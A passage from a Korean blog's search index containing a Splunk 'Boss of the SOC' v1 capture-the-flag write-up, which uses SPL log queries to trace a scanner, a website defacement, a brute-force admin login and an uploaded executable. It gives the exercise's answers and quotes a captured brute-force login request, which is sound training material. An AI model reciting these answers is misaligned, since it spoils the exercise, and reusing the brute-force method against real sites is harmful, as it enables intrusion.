values(sourcetype)sourcetype은 아래와 같습니다.scan을 수행한 컴퓨터의 ip를 찾는거니 stream:http에 우리가 원하는 데이터가 있을것입니다.또, scan tool을 실행하면 http header의 user-agent에 scan tool에 대한 정보가 추가되므로 scan키워드를 추가해서 검색해봅니다.sourcetype=stream:http imreallynotbatman.com *scan*src_header에 scan 정보를 볼 수 있다.추가로, imreallynotbatman.com의 ip는 192.168.250.70라는 정보도 얻을 수 있습니다.답 : 40.80.148.42102 What company created the web vulnerability scanner used by Po1s0n1vy? Type the company name. (For example “Microsoft” or “Oracle”)Po1s0n1vy가 사용하는 웹 취약점 스캐너를 만든 회사는? 회사 이름을 입력합니다. (예: “Microsoft” 또는 “Oracle”)  hint#1  Many commercial web vulnerability scanners clearly identify themselves in the headers of the HTTP request. Inspect the HTTP source headers (src_headers) of requests from the IP identified in question 101.    많은 상용 웹 취약점 스캐너는 HTTP 요청의 헤더에서 자신을 명확하게 식별합니다. 질문 101에서 식별된 IP의 요청에 대한 HTTP 소스 헤더(src_headers)를 검사합니다.header정보가 “Acunetix”라는 키워드가 있다. 구글링해봅시다.구글링결과, scan tool을 제작하는 회사명이다.답 : Acunetix103\tWhat content management system is imreallynotbatman.com likely using?(Please do not include punctuation such as . , ! ? in your answer. We are looking for alpha characters only.)imreallynotbatman.com은 어떤 콘텐츠 관리 시스템을 사용하고 있습니까?(답변에 . , ! ?와 같은 문장부호를 포함하지 마십시오. 우리는 알파 문자만 찾고 있습니다.)  hint#1  Look for successful (http status code of 200) GET requests from the scanning IP address (identified previously) and inspect the fields related to URL/URI for clues to the CMS in use.    스캐닝 IP 주소(이전에 식별)에서 성공적인(http 상태 코드 200) GET 요청을 찾고 사용 중인 CMS에 대한 단서가 있는지 URL/URI와 관련된 필드를 검사합니다.content management system가 뭔지부터 알아봅시다.저작물 관리시스템이라함은, 파일 등을 upload하는 서버일 것입니다. 아래 조건을 추가해 URL field를 검색해봅시다.  http status code를 200이다.  HTTP요청은 POST일것 이다.(upload)  upload할떄 content-type은 application/x-www-form-urlencoded일것이다.sourcetype=stream:http imreallynotbatman.com status=200 http_method=POST cs_content_type=application/x-www-form-urlencoded결과 중 uri_path field를 보면 joomla라는 키워드를 발견할 수 있습니다.joomla를 구글링해봅시다.joomla는 CMS의 종류임을 알 수있습니다.답 : joomla104\tWhat is the name of the file that defaced the imreallynotbatman.com website? Please submit only the name of the file with extension (For example “notepad.exe” or “favicon.ico”)imreallynotbatman.com 웹사이트를 침해한 파일의 이름은 무엇입니까? 확장자가 있는 파일 이름만 제출하십시오(예: “notepad.exe” 또는 “favicon.ico”).  hint#1  First find the IP address of the web server hosting imreallynotbatman.com. You may have found this IP during the course of answering the previous few questions.    먼저 imreallynotbatman.com을 호스팅하는 웹 서버의 IP 주소를 찾습니다. 이전 질문에 답하는 과정에서 이 IP를 발견했을 수 있습니다.  hint#2  Revealing sourcetypes include stream:http, fgt_utm, and suricata.    소스 유형에는 stream:http, fgt_utm 및 suricata가 포함됩니다.  hint#3  The key here is searching for events where the IP address of the web server is the source. Because it's a web server, we most often see it as a destination but in this case the intruder took control of the server and pulled the defacement file from an internet site.    여기서 핵심은 웹 서버의 IP 주소가 소스인 이벤트를 검색하는 것입니다. 웹 서버이기 때문에 우리는 목적지로 가장 많이 보지만 이 경우에는 침입자가 서버를 제어하고 인터넷 사이트에서 변조 파일을 가져왔습니다.우선 101질문에서 보았듯이, imreallynotbatman.com의 IP는 192.168.250.70입니다. suricata에서 특이한 이벤트가 있는지 찾아봅니다.※ suricata는 오픈소스 IDS입니다. 패턴에 의해 악성패킷을 차단하는 이벤트가 있을것으로 예상합니다.  suricata란?sourcetype=suricata dest=192.168.250.70 | stats count by src|src|count||—|—||192.168.2.50|211|192.168.250.70|210|별 특이점은 없어보입니다. 리버스 커넥션의 경우도 있을 수 있으니 해당 ip를 src로 두어 다시 검색해봅니다.리버스 커넥션은 inbound가 아닌 outbound로 CnC서버(악성서버)에 접속하는 기법을 말합니다.자세한 내용은 아래사이트 참고해주세요.  reverse connection이란?sourcetype=suricata src=192.168.250.70 | stats count by dest_ip| sort -count            dest_ip      count                  40.80.148.42      10317              23.22.63.114      1294              192.168.250.40      758              192.168.2.50      214              192.168.250.70      210              108.161.187.134      12              192.168.250.255      3              224.0.0.252      3      공인망중 접근 count가 많은것이 있습니다. (40.80.148.42, 23.22.63.114)보통 웹서버는 outbound 통신이 많지 않습니다.40.80.148.42은 101번 문제에서 풀었던 scan pc의 IP입니다.해당 통신 중 특이한 점이 있는지 찾아봅니다.sourcetype=suricata src=192.168.250.70 dest_ip=23.22.63.114url field를 보니 의심스러운 url이 있습니다.확실하지 않으니, 192.168.250.70(imreallynotbatman.com)가 src인 이벤트가 얼마나 많은지 stream:http에서 찾아봅니다.index=botsv1 src_ip=192.168.250.70 sourcetype=stream:httpsuricata와 stream:http 모두 해당 uri에 접근한 이력이 있습니다. poisonivy-is-coming-for-you-batman.jpeg답 : poisonivy-is-coming-for-you-batman.jpeg105\tThis attack used dynamic DNS to resolve to the malicious IP. What fully qualified domain name (FQDN) is associated with this attack?이 공격은 동적 DNS를 사용하여 악성 IP를 확인합니다. 이 공격과 관련된 FQDN(도메인 이름)은 무엇입니까?  hint#1  Consider the answer to question 104. The fully qualified domain name was recorded by Stream, Suricata, and the Fortigate firewall.  104번 질문에 대한 답을 생각해 보십시오. 정규화된 도메인 이름은 Stream, Suricata 및 Fortigate 방화벽에 의해 기록되었습니다.104번에서 확인한 jepg파일을 키워드로, strean:http sourcetype에서 url 필드를 확인해보면 full domain이 나올것입니다.sourcetype=stream:http src=192.168.250.70 poisonivy-is-coming-for-you-batman.jpeg답 : prankglassinebracket.jumpingcrab.com106\tWhat IP address has Po1s0n1vy tied to domains that are pre-staged to attack Wayne Enterprises?Po1s0n1vy가 Wayne Enterprises를 공격하기 위해 사전 준비된 도메인에 연결된 IP 주소는 무엇입니까?  hint#1  Consider the answer to question 104. The IP address was recorded by Stream, Suricata, and the Fortigate firewall. Do you dig me?    104번 질문에 대한 답을 생각해 보십시오. IP 주소는 Stream, Suricata 및 Fortigate 방화벽에 의해 기록되었습니다.104번 문제에서 공격자의 IP주소는 23.22.63.114 이었음을 파악했습니다.답 : 23.22.63.114107\tBased on the data gathered from this attack and common open source intelligence sources for domain names, what is the email address that is most likely associated with Po1s0n1vy APT group? 이 공격에서 수집한 데이터와 도메인 이름에 대한 일반적인 오픈 소스 인텔리전스 소스를 기반으로 할 때 Po1s0n1vy APT 그룹과 가장 관련이 있는 이메일 주소는 무엇입니까?  hint#1  Malicious IP addresses, like the one in the last question are examples of attacker infrastructure. Infrastructure is often reused by the same group. Use a service like www.robtex.com to determine other domains that are or have been associated with this attacker infrastructure (IP address).    마지막 질문과 같은 악성 IP 주소는 공격자 인프라의 예시입니다. 인프라는 동일한 그룹에서 재사용되는 경우가 많습니다. www.robtex.com과 같은 서비스를 사용하여 이 공격자 인프라(IP 주소)와 관련되어 있거나 연결된 다른 도메인을 확인합니다.  hint#2  Use the whois lookup on domaintools.com to iterate through domains associated with this IP and visually search for suspicious email addresses. Your knowledge of Batman will help you here!    domaintools.com에서 whois 조회를 사용하여 이 IP와 연결된 도메인을 반복하고 의심스러운 이메일 주소를 시각적으로 검색합니다.   이 문제는 OSINT(공개된 출처에서 얻은 정보)를 사용해야합니다. 현재는 OSINT의 해당정보가 변경되어 과거 자료를 인용해서 해결하겠습니다.  OSINT란?  splunk OSINT 관련 포스팅robtex.com는 IP, Domain을 통해서 해당 사이트의 정보에 대해 알 수 있습니다.robtex에 prankglassinebracket.jumpingcrab.com 검색하면 아래와 같이 조회됩니다.robtex에서 특이한 정보를 찾지 못했으니 virustotal에 검색해봅시다.domain정보에 email 정보를 발견할 수 있습니다.답 : lillian.rose@po1s0n1vy.com108\tWhat IP address is likely attempting a brute force password attack against imreallynotbatman.com?imreallynotbatman.com에 대해 무차별 암호 대입 공격을 시도할 가능성이 있는 IP 주소는 무엇입니까?  hint#1  Login attempts will use the HTTP POST method, and they will include some obvious fields in the form_data field of stream:http events.    로그인 시도는 HTTP POST 메서드를 사용하며 여기에는 stream:http 이벤트의 form_data 필드에 몇 가지 명백한 필드가 포함됩니다.  brute force 공격이란?login 관련 데이터는 stream:http에 있을 것입니다. 아래 기준에 맞춰 쿼리를 작성해보겠습니다.  method는 post일것.  login 데이터는 form_data 태그에 있을 것.  password, passwd, admin등의 키워드가 있을것.  brute force를 시행했다면, 통신 수가 많을 것.sourcetype=stream:http http_method=POST form_data=*passwd* OR form_data=*password* OR form_data=*admin* dest=192.168.250.70| stats count by src  쿼리 결과            dest_ip      count                  23.22.63.114      412              40.80.148.42      8      src가 23.22.63.114인 form_data의 결과를 보면username=admin&amp;task=login&amp;return=aW5kZXgucGhw&amp;option=com_login&amp;passwd=7777777&amp;1af64a5fa91b91c7107ac2b8e2d4d28a=1로, 전형적인 brute force attack의 형태이다.답 : 23.22.63.114109\tWhat is the name of the executable uploaded by Po1s0n1vy? Please include file extension. (For example, “notepad.exe” or “favicon.ico”)  hint#1  File uploads to web forms use the HTTP POST method.    파일 업로드는 HTTP POST 방법을 사용합니다.  hint#2  The question mentions and executable. Search for common executable filename extensions on Windows systems.    Windows 시스템에서 실행 파일 이름 확장자를 검색합니다.  window의 excuteable file이니 .exe가 포함될것.  file upload시 http method는 post입니다.sourcetype=stream:http http_method=POST dest=192.168.250.70 *.exepart_filename이라는 필드에 3791.exe라는 이름의 파일이 보입니다.해당파일을 전송한 ip를 확인해보니, 101번 문제해서 scan했던 IP와 같으므로 악성파일임을 확신할 수 있습니다.답 : 3791.exe110\tWhat is the MD5 hash of the executable uploaded?  hint#1  It will be difficult to calulate a hash based on the Splunk event you used to answer 109. Instead Search for the file name in a different data source to find evidence of execution, including file hash values.     109번에서 사용한 Splunk 이벤트를 기반으로 해시를 계산하는 것은 어려울 것입니다. 대신 다른 데이터 소스에서 파일 이름을 검색하여 파일 해시 값을 포함하여 실행 증거를 찾으십시오.  hint#2  This is an ideal use case for Microsoft Sysmon data. Determine the sourcetype for Sysmon events and search them for the executable.    이것은 이상적인 Microsoft Sysmon 데이터 usecase 입니다. Sysmon 이벤트의 소스 유형을 결정하고 실행 파일을 검색합니다.sourcetype Sysmon에서 3791.exe를 키워드로 이벤트를 검색합니다.해답은 window 이벤트 로그인 sysmon에서 찾을 수 있을 것입니다.syslog란?3791.exe파일을 실행하는 event값에 hash 정보가 포함되어있을 것입니다.sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational 3791.exe | where isnotnull(ParentCommandLine) and isnotnull(CommandLine)| table EventDescription CommandLine ParentCommandLine MD5            EventDescription      CommandLine      ParentCommandLine      MD5                  Process Create      3791.exe      cmd.exe /c “3791.exe 2&gt;&amp;1”      AAE3F5A29935E6ABCC2C2754D12A9AF0              Process Create      \\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff      cmd.exe /c “3791.exe 2&gt;&amp;1”      626A9EC445D06FBC1502BF53A1E3356B              Process Create      cmd.exe /c “3791.exe 2&gt;&amp;1”      “C:\\Program Files (x86)\\PHP\\v5.5\\php-cgi.exe”      59A1D4FACD7B333F76C4142CD42D3ABA              Process Create      C:\\Windows\\system32\\cmd.exe      3791.exe      59A1D4FACD7B333F76C4142CD42D3ABA              Process Create      C:\\Windows\\system32\\cmd.exe      3791.exe      59A1D4FACD7B333F76C4142CD42D3ABA      3791.exe를 실행한111\tGCPD reported that common TTPs (Tactics, Techniques, Procedures) for the Po1s0n1vy APT group, if initial compromise fails, is to send a spear phishing email with custom malware attached to their intended target. This malware is usually connected to Po1s0n1vys initial attack infrastructure. Using research techniques, provide the SHA256 hash of this malware.  hint#1  You need to pivot outside of Splunk to answer this question. Use the IP address discovered earlier to search for malware that has been associated with it in the past.  이 질문에 답하려면 Splunk 외부로 피벗해야 합니다. 이전에 검색된 IP 주소를 사용하여 과거에 연결된 맬웨어를 검색합니다.  hint#2  Experienced analysts know to use sites like www.threatminer.org to search for malware associated with the malicious IP address, but if all alse fails, Google it!    전문분석가는 www.threatminer.org와 같은 사이트를 사용하여 악성 IP 주소와 관련된 맬웨어를 검색하지만, 발견 실패시 Google에서 검색하십시오!112\tWhat special hex code is associated with the customized malware discussed in question 111? (Hint: It’s not in Splunk)  hint#1  Do some further research on the hash discovered in the last question. Virustotal.com is a good starting place.      마지막 문제에서 발견된 해시에 대해 좀 더 조사하십시오. Virustotal.com에서 검색해봅니다.  hint#2  malwr.com might lead you astray.    malwr.com은 잘못된 방향입니다.  hint#3  The hex codes we are after here will be formatted like this: 49 66 20 79 6f 75 20 64 65 63 6f 64 65 20 74 68 65 20 68 69 6e 74 2c 20 79 6f 75 20 64 6f 6e 27 74 20 6e 65 65 64 20 61 20 68 69 6e 74 21. Submit the hex codes, but decode them on the web for fun!    16진수 코드는 49 66 20 79 6f 75 20 64 65 63 6f 64 65 20 74 68 65 20 68 69 6e 74 2c 20 79 6f 645 64 20 61 20 68 69 6e 74 21. 16진수 코드를 제출하되 웹에서 디코딩하십시오!113\tOne of Po1s0n1vy’s staged domains has some disjointed “unique” whois information. Concatenate the two codes together and submit as a single answer.  hint#1  Use a service like www.robtex.com to determine other domains that are or have been associated with the attacker infrastructure (IP address).      hint#2  Use a high quality whois site like www.domaintools.com to perform whois lookups against these domains until you see a hex code where you were expecting text. Warning not all whois sites show you all fields!  114\tWhat was the first brute force password used?  hint#1  Login attempts will use the HTTP POST method, and they will include some obvious fields that you can search for in the form_data field of stream:http events.    로그인 시도는 HTTP POST 메서드를 사용하며 여기에는 stream:http 이벤트의 form_data 필드에서 검색할 수 있는 몇 가지 명백한 필드가 포함됩니다.  hint#2  By default, Splunk will put the most recent events at the top of the list. You can use the \"reverse\" SPL command to show you least recent first.    Splunk는 가장 최근 이벤트를 목록 맨 위에 놓습니다. \"reverse\" SPL 명령을 사용하여 가장 최근의 것을 먼저 표시할 수 있습니다.108번에서 발견한 정보를 토대로 brute force attack를 발췌해봅시다.형식은 passwd=xxx기준이니, 정규표현식을 사용합니다.sourcetype=stream:http http_method=POST src=23.22.63.114 dest=192.168.250.70| rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\"| table _time brutePassword| sort _time  결과제일 먼저 나오는 패스워드는 12345678입니다.답 : 12345678115\tOne of the passwords in the brute force attack is James Brodsky’s favorite Coldplay song. Hint: we are looking for a six character word on this one. Which is it?brute force attack의 암호 중 하나는 James Brodsky가 가장 좋아하는 Coldplay 노래입니다. 힌트: 이 단어에서 6자 단어를 찾고 있습니다. 어떤것 인가?  hint#1  If you have not done so already, try to extract the attempted password into a new field using the \"rex\" SPL command and a regular expression. Having the password attempt in its own field will serve you well for the next several questions!    아직 수행하지 않은 경우 \"rex\" SPL 명령과 정규식을 사용하여 시도한 암호를 새 필드에 추출해 보십시오. 자체 필드에 비밀번호를 입력하면 다음 몇 가지 질문에 도움이 됩니다!  hint#2  It's not hard to get a list of songs by the artist. Once you have that,use the \"len()\" function of the \"eval\" SPL command. For Splunk style points, use a lookup table to match the password attempts with songs.  아티스트의 노래 목록을 얻는 것은 어렵지 않습니다. 일단 가지고 있으면 \"eval\" SPL 명령의 \"len()\" 함수를 사용하십시오. Splunk 스타일의 경우 조회 테이블을 사용하여 노래와 비밀번호를 일치시킵니다.  114번에서 사용한 쿼리를 사용하겠습니다.그리고, 조건을 걸어 6자리 패스워드를 발췌하겠습니다.sourcetype=stream:http http_method=POST src=23.22.63.114 dest=192.168.250.70| rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\"| where len(brutePassword)=6overview에서 소개한 쿼리를 사용할 차례입니다. csv파일중 cp.csv 파일이 있습니다.| rest /servicesNS/-/-/data/lookup-table-filessourcetype=stream:http http_method=POST src=23.22.63.114 dest=192.168.250.70| rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\" ```brutePassword변수에 패스워드 발췌 표현식```| where len(brutePassword)=6```패스워드 중 6자리글자인것만 발췌```| table brutePassword | join type=inner brutePassword ```cold play 노래제목 파일과 join```    [ | inputlookup coldplay.csv     | rename song as brutePassword     | fields brutePassword ]  결과            brutePassword                  yellow      답 : yellow116\tWhat was the correct password for admin access to the content management system running “imreallynotbatman.com”?“imreallynotbatman.com”을 실행하는 콘텐츠 관리 시스템에 대한 관리자 액세스의 올바른 비밀번호는 무엇입니까?  hint#1  From the previous questions, you should know how to extract the password attempts.  You should also know what IP is submitting passwords.  Are any other IP addresses submitting passwords?  전 질문에서 비밀번호 시도를 추출하는 방법을 알아야 합니다. 또한 어떤 IP가 로그인 시도했는지 알아야 합니다. 로그인을 시도하는 다른 IP 주소가 있습니까?  탐색 전략은 아래와 같습니다.  brute force는 같은 패스워드는 한번만 시도한다.  올바른 패스워드를 찾았다면 같은 패스워드 사용이 2번이상 있을것이다.sourcetype=stream:http dest=192.168.250.70| rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\"| stats count by brutePassword| sort -count  결과            brutePassword      count                  batman      2              000000      1              1111      1                  brutePassword      count      values(src)                  batman      2      23.22.63.11440.80.148.42              000000      1      23.22.63.114              1111      1      23.22.63.114      40.80.148.42(scan ip)로 로그인했음을 알 수 있습니다.답 : batman117\tWhat was the average password length used in the password brute forcing attempt? (Round to closest whole integer. For example “5” not “5.23213”)brute force attack 시도에 사용된 평균 암호 길이는 얼마입니까? (가장 가까운 정수로 반올림합니다. 예를 들어 “5.23213”이 아닌 “5”)  hint#1  Calculate the length of every password attempt and store the result in a new field. Then calulate the average of that new field with a stats command. Use eval to average, or just visually inspect.    모든 암호 시도의 길이를 계산하고 결과를 새 필드에 저장합니다. 그런 다음 stats 명령으로 새 필드의 평균을 계산합니다. 평균을 내기 위해 eval을 사용하거나 그냥 육안으로 검사하십시오.  hint#2  Then calulate the average of that new length field with a stats command, and finally use eval to round, or just manually round.    그 후 stats 명령으로 새 길이 필드의 평균을 계산하고 마지막으로 eval을 사용하여 반올림하거나 수동으로 반올림합니다.sourcetype=stream:http dest=192.168.250.70| rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\"| eval lenPwd = len(brutePassword)| stats avg(lenPwd) as avglenPwd| eval answer=round(avglenPwd,0)            avglenPwd      answer                  6.174334140435835      6      답 : 6118\tHow many seconds elapsed between the time the brute force password scan identified the correct password and the compromised login? Round to 2 decimal places.brute force attack시 올바른 암호를 식별한 시간과 성공한 로그인 사이에 몇 초가 경과했습니까? 소수점 이하 2자리까지 반올림합니다.  hint#1  You'll note from previous answers that one of the passwords was attempted twice. You need to calculate the duration of time between those two attempts.    이전 답변에서 비밀번호 중 하나가 두 번 시도되었음을 알 수 있습니다. 이 두 시도 사이의 시간을 계산해야 합니다.  hint#2  Need more help? Write a search that returns only the two events in questions, then use  either \"| delta _time\" or \"| transaction [extracted-pword-attempt]\" SPL commands.    도움이 더 필요하세요? 질문에서 두 개의 이벤트만 반환하는 검색을 작성한 다음 \"| delta _time\" 또는 \"| transaction [extracted-pword-attempt]\" SPL 명령을 사용하십시오.위에서 올바른 암호는 batman이었으니, 암호가 batman인 이벤트의 시간차를 구해봅시다.sourcetype=stream:http dest=192.168.250.70| rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\"| search brutePassword=batman| table _time brutePassword            _time      brutePassword                  2016/08/10 21:46:33.689      batman              2016/08/10 21:48:05.858      batman      차이는 92.169인데, 2번째자리에서 반올림하면 92.17이다.답 : 92.17※ 풀이2transaction이라는 명령어가 있다.splunk transaction명령어sourcetype=stream:http  | rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\" | search brutePassword=batman| transaction brutePassword | eval duration=round(duration, 2)| table duration            duration                  92.169084      119\tHow many unique passwords were attempted in the brute force attempt?brute force attack에서 사용한 패스워드는 몇가지입니까?  hint#1  Be sure you are extracting the password attempts correctly, then use a stats function to count unique (not total) attempts.  비밀번호 시도를 올바르게 추출했는지 확인한 다음 통계 기능을 사용하여 고유한(총 시도가 아닌) 시도를 계산하십시오.중복값을 제거하는 dedup명령어를 사용하여 총 이벤트 수를 파악한다.sourcetype=stream:http  | rex field=form_data \"passwd=(?&lt;brutePassword&gt;\\w+)\" | dedup brutePassword답 : 412",
        "url": "/splunk-BOTS-v1-part1"
    }
    ,
    
    "splunk-bots-overview": {
        "title": "splunk-bots 개론",
            "author": "wind-flow",
            "category": "",
            "content": "Splunk SOC 대회인 BOSS OF THE SOC(BOTS)Splunk BOTS의 데이터셋은 3개입니다.  BOTS란?   BOTS v1 Write up(1)  BOTS v1 Write up(2) - END  BOTS v2 Write up(1)   BOTS v2 Write up(2)   BOTS v2 Write up(3)   BOTS v2 Write up(4)   BOTS v2 Write up(5) - END  BOTS v3 Write up(1)  BOTS v3 Write up(2)  BOTS v3 Write up(3)  BOTS v3 Write up(4) - END  BOTS v4 결과BOTS란 ?Boss of the SOC (BOTS) 대회는 Splunk를 활용, 제한 시간 동안 해커들의 침입으로 발생한 보안 사고를 해결하는 보안 전문가들의 대회입니다. 매일 발생하는 실제 보안 사고 시나리오를 바탕으로 Splunk의 모든 보안 솔루션(Splunk User Behavior analytics, Splunk Enterprise Security, Splunk Phantom)을 활용하여 보안 사고에 방어해야 합니다.BOTS 대회 안내대회 출전에 앞서 필요한 데이터 발췌에 유용한 검색 기법을 소개하고자 합니다.Sourcetype 한눈에 보기| metadata type=sourcetypes index=botsv1| stats values(sourcetype)metadata 명령어에 대해선 이 링크를 참고하세요Field와 Vaule 한눈에 보기      설정 클릭 후 고급검색을 누릅니다.        검색 매크로 옆 +새로 추가를 누릅니다.        아래 쿼리를 fieldbrief란 이름의 매크로로 저장합니다.    | fieldsummary| search values!=\"[]\"| fields field values| rex field=values max_match=0 \"\\{\\\"value\\\":\\\"(?&lt;extract_values&gt;[^\\\"]+)\\\"\"| fields field extract_values| eval extract_values=mvdedup(extract_values)        조회할 sourcetype을 기재 후 fieldsbreif를 추가하면 아래와 같이 field와 값들을 한눈에 볼 수 있습니다.LookUp file 조회splunk에 어떤 데이터들이 import되었는지 조회할 수 있는 쿼리입니다.| rest /servicesNS/-/-/data/lookup-table-filesV1의 115번 문제를 풀때 Coldplay의 노래제목 데이터가 필요합니다.115\tOne of the passwords in the brute force attack is James Brodsky’s favorite Coldplay song. Hint: we are looking for a six character word on this one. Which is it?coldplay 노래 데이터를 lookup파일 형태로 제공하고 있는지 위 쿼리로 조회를 해볼 수 있습니다.",
        "url": "/splunk-BOTS-overview"
    }
    
    
    };
</script>
<script src="assets/js/lunr.js"></script>
<script src="assets/js/search.js"></script>
            </section>

        </article>

    </div>
</main>

<!-- /post -->

<!-- The #contentFor helper here will send everything inside it up to the matching #block helper found in default.hbs -->
<script>
$(function() {
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
});
</script>



        <!-- Previous/next page links - displayed on every page -->
        

        <!-- The footer at the very bottom of the screen -->
        <footer class="site-footer outer">
            <div class="site-footer-content inner">
                <section class="copyright"><a href="https://wind-flow.github.io/">wind-flow Tech Blog</a> &copy; 2022</section>
                <section class="poweredby">Proudly published with <a href="https://jekyllrb.com/">Jekyll</a> &
                    <a href="https://pages.github.com/" target="_blank" rel="noopener">GitHub Pages</a> using
                    <a href="https://github.com/jekyllt/jasper2" target="_blank" rel="noopener">Jasper2</a></section>
                <nav class="site-footer-nav">
                    <a href="/">Latest Posts</a>
                    
                    
                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
                </nav>
            </div>
        </footer>

    </div>

    <!-- The big email subscribe modal content -->
    
    <div id="subscribe" class="subscribe-overlay">
        <a class="subscribe-overlay-close" href="#"></a>
        <div class="subscribe-overlay-content">
            
            <h1 class="subscribe-overlay-title">Search wind-flow Tech Blog</h1>
            <p class="subscribe-overlay-description">
            lunr.js를 이용한 posts 검색 </p>
            <span id="searchform" method="post" action="/subscribe/" class="">
    <input class="confirm" type="hidden" name="confirm"  />
    <input class="location" type="hidden" name="location"  />
    <input class="referrer" type="hidden" name="referrer"  />

    <div class="form-group">
        <input class="subscribe-email" onkeyup="myFunc()" 
               id="searchtext" type="text" name="searchtext"  
               placeholder="Search..." />
    </div>
    <script type="text/javascript">
        function myFunc() {
            if(event.keyCode == 13) {
                var url = encodeURIComponent($("#searchtext").val());
                location.href = "/search.html?query=" + url;
            }
        }
    </script>
</span>
        </div>
    </div>
    

    <!-- highlight.js -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
    <script>$(document).ready(function() {
      $('pre code').each(function(i, block) {
        hljs.highlightBlock(block);
      });
    });</script>

    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
    <script
        src="https://code.jquery.com/jquery-3.2.1.min.js"
        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
        crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>


    <!-- Paginator increased to "infinit" in _config.yml -->
    <!-- if paginator.posts  -->
    <!-- <script>
        var maxPages = parseInt('');
    </script>
    <script src="/assets/js/infinitescroll.js"></script> -->
    <!-- /endif -->

    


    <!-- Add Google Analytics  -->
    <!-- Google Analytics Tracking code -->
 <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-xxxxxxxx-x', 'auto');
  ga('send', 'pageview');

 </script>


    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
    
        <script>
$(function() {
    var $postContent = $(".post-full-content");
    $postContent.fitVids();
});
</script>

    

    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
    <!-- ghost_foot -->

</body>
</html>
